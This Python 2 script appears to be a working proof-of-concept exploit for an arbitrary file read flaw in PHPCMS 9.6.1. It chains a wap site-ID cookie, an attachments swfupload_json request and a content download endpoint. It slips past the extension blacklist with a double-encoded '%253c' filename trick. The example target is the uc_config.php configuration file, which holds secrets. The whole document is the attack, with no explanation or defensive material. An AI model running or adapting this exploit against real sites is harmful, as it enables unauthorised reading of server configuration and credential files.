#!/usr/bin/env python
# https://segmentfault.com/a/1190000009279116

import sys
import os
import re
import json
import urllib
import requests
import itertools

blacklist = r'(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)'
session   = requests.Session()

def get_init_url(baseurl, path):
    folder   = os.path.dirname(path) + '/'
    filename = os.path.basename(path)

    if re.search(blacklist, filename):
        # e.g '.p%253chp'
        filename = filename[:-1] + '%253c' + filename[-1]
        parts    = filename.rsplit('.', 1)

        folder   = folder + parts[0]
        filename = '.' + parts[1]

    args = 'pad=x&i=1&modelid=1&catid=1&d=1&m=1&f={}&s={}&pade='.format(filename, folder)
    return baseurl + '?m=attachment&c=attachments&a=swfupload_json&aid=1&src=' + urllib.quote_plus(args)

def get_download_url(baseurl, att_json):
    return '{}?m=content&c=down&a=init&a_k={}'.format(baseurl, att_json)

def get_att_json(baseurl, site_id, target):
    url  = get_init_url(baseurl, target)
#    print 'INIT URL: ', url

    resp = session.post(url, {'userid_flash': site_id})

    match = re.search(r'_att_json=(.*)', resp.headers['set-cookie'])
    if match:
        return match.group(1)

    return None

def get_wap_siteid(baseurl):
    resp  = session.get('{}?m=wap&c=index&a=init&siteid=1'.format(baseurl))
    match = re.search(r'_siteid=(.*)', resp.headers['set-cookie'])

    if match:
        return match.group(1)

    return None

def get_final_link(baseurl, downurl):
    resp = session.get(downurl);
    url  = None

    for line in resp.text.split("\n"):
        match = re.search(r'href="(.*)" class="xzs_btn"', line)
        if match:
            url = '{}{}'.format(baseurl, match.group(1))
            break

    return url

def cat_url(url):
    print session.get(url).text

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print '''
Usage: 
    {} http://centos6/phpcms961/index.php ./phpsso_server/caches/configs/uc_config.php
'''.format(sys.argv[0])
        sys.exit()

    baseurl  = sys.argv[1] # 'http://centos6/phpcms961/index.php'
    target   = sys.argv[2] # './phpsso_server/caches/configs/uc_config.php'

    site_id  = get_wap_siteid(baseurl)
    att_json = get_att_json(baseurl, site_id, target)
    downurl  = get_download_url(baseurl, att_json)

#    print 'SiteID:  ', site_id
#    print 'AttJSON: ', att_json
#    print 'DownURL: ', downurl

    fileurl  = get_final_link(baseurl, downurl)
#    print 'FILE: ', fileurl

    cat_url(fileurl)
